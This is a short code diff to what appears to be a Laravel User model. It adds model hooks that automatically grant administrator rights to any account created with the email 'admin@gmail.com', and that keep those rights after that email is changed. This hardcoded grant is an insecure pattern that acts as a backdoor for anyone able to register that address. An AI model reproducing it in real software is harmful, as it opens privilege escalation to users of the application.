@@ -47,6 +47,23 @@ class User extends Authenticatable
         ];
     }
 
+      protected static function boot()
+    {
+        parent::boot();
+
+        static::creating(function ($user) {
+            if ($user->email === 'admin@gmail.com') {
+                $user->is_admin = true;
+            }
+        });
+
+        static::updating(function ($user) {
+            if ($user->isDirty('email') && $user->getOriginal('email') === 'admin@gmail.com') {
+                $user->is_admin = true;
+            }
+        });
+    }
+
    public function carts()
 {
     return $this->hasMany(Cart::class);
